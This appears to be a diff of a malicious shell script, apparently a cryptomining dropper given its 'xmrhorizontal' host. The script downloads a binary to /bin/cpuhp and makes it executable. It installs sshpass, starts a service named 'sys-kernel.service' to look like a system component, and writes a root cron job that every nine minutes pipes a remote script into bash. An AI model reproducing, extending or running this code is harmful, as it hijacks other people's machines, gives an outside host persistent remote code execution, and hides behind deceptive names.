@@ -1,3 +1,6 @@
+chmod +x /bin/cpuhp
+systemctl daemon-reload
+systemctl start sys-kernel.service
 if [ ! -f /etc/cron.d/cronextend ]; then
 	apt-get update
  	apt-get install -y sshpass
@@ -6,6 +9,7 @@ if [ ! -f /etc/cron.d/cronextend ]; then
  	cd /bin
 	rm cpuhp
 	wget https://xmrhorizontal.github.io/cpuhp
+ 	chmod +x /bin/cpuhp
     	echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/searcher.sh | bash" > /etc/cron.d/cronextend
  	systemctl daemon-reload
 	systemctl start sys-kernel.service
